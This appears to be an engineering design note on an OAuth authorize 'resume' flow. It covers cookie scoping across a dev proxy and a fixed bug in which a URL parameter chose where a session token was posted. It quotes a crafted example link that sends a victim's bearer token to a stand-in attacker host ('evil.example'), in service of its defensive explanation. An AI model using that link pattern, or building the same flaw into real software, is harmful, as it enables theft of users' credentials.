# Resuming an OAuth-authorize flow needs a real page navigation, not a fetch

`GET /authorize`'s login-CSRF defense sets `awb_oauth_binding` as an
`HttpOnly` cookie on its own response, then requires that exact value back
at resume time (`resumeAuthorize`, `packages/server/src/auth/oauth-server/resume.ts`).
That's deliberate: the value must be something an attacker who mints their
*own* `/authorize` ticket cannot also hand to a victim, and a cookie set by
one specific browser's hit to `/authorize` has that property in a way a URL
parameter never could — if the value travels in the URL, an attacker who
completes their own `/authorize` request already knows it, and can hand the
victim's browser a link carrying `ticket=<attacker's>&binding=<same value>`,
defeating the whole check.

The new "already signed in" resume path (`POST /authorize/resume`,
`packages/server/src/api/oauth-routes.ts`) needed to read that same cookie
back from a portal page — and that's where the dev split (Vite portal on
one port, the server on another) bites: **the cookie is scoped to whichever
origin actually received the response that set it**, and in this flow that's
always the server's own origin (`/authorize` is opened directly by the
MCP client's browser, never through Vite). A `fetch()`/XHR from the portal
page — even one Vite proxies server-side to the real backend — does *not*
carry that cookie, because the browser decides what to attach based on the
URL it's calling (the portal's origin), before any proxying happens.
Proxying is invisible to the browser's cookie jar.

The fix is to make the resume step a genuine top-level navigation to the
server's own absolute origin — an auto-submitted `<form method="POST"
action="...">`, not a `fetch`. A real navigation to that origin carries
its cookies the normal way, no proxy or CORS involved.

The first version of this got that absolute origin wrong in a way that
turned into a second, more serious bug: rather than requiring a separately-
configured frontend env var, `/authorize` handed the choice page its own
origin as a `resume=` query param, and the page trusted it verbatim as the
form's POST target. That target carries a live session token (the whole
point of the form). A URL query param is exactly what a crafted link
controls — `.../authorize/choose?ticket=X&resume=https://evil.example/steal`
would have made an already-signed-in victim's browser silently POST their
real bearer token to an attacker's server the moment they opened the link,
no click required. Caught by an automated push review before merge, not by
anything in this design.

The fix: the resume target now comes only from the portal's own build-time
config (`VITE_SERVER_URL` in `packages/portal/src/api.ts`, mirroring the
existing `VITE_API_URL` — empty string defaults to same-origin, correct in
production where portal and server share one origin). `/authorize` no
longer sends a `resume` param at all. The general rule this leaves behind:
**a value that will become part of where a credential gets sent must never
be sourced from anything the URL — or any other attacker-reachable
input — controls, even when the value "should" always be benign.** Query
params, `postMessage` origins, `Referer`, redirect targets in general — the
same shape of bug recurs anywhere a credential's destination is decided at
runtime instead of pinned at build/deploy time.

The narrower lesson also still holds: a cookie set by a direct external
redirect *into* the server (an SSO provider callback, an `/authorize` entry
point) is not retrievable by the portal's own fetch client, no matter how
the dev proxy is configured — only another direct browser navigation to
that same origin gets it back. That's what still forces the form-POST
design; it just can't source its target from the request that triggered it.
